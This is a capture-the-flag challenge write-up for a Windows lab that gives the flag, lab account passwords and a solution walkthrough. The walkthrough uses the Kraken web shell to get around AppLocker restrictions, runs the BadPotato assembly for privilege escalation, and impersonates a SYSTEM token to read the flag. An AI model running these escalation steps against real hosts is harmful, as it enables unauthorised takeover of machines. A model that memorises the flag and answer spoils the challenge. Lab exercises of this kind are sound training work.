# Challenge 02 - Dalgona Candy

- Main Flag: `squid-game{H4rdPr1v3scW1th0utCMD}`

## Description

Nice to see you again!

The next game is called **"Dalgona Candy"**, pay attention to the following rules:

- To win this game you must focus on being accurate and effective. The objective is quite, but you will find it difficult to complete.
- As you can see, there is no single way to win the game. Choose the safest way to do it.
- We remind you that, if you are not careful, and you are too tough, you will be eliminated.

To get started visit the following link:

https://challenge-02.makemalware.com

Good luck!

## Deploy

Credentials:
- Administrator: `Squ1dG4meAdminCr3d3nt14l!`
- triangle: `Squ1dG4meAdminCr3d3nt14l!`
- webusr: `Squ1dG4meW3bSrvCr3d3nt14l!`

## Solution

Solution using [Kraken](https://github.com/kraken-ng/Kraken):

```shell
sysinfo
help

# Checking we can't execute any commands because AppLocker Policies
execute "whoami"
execute -e C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -- -c Get-Host

# Listing user identity and privileges 
whoami
whoami -g
whoami -p

# Elevation of privileges using BadPotato assembly
list_tokens
execute_assembly -f /tmp_kraken/badpotato_net40_x64.exe -n BadPotato -c Program -m call

# Impersonating SYSTEM account using its primary leaked token
list_tokens
set_token 1852
whoami
whoami -p

cd C:/Users/Administrator/Desktop
ls
cat squid-flag.txt
```
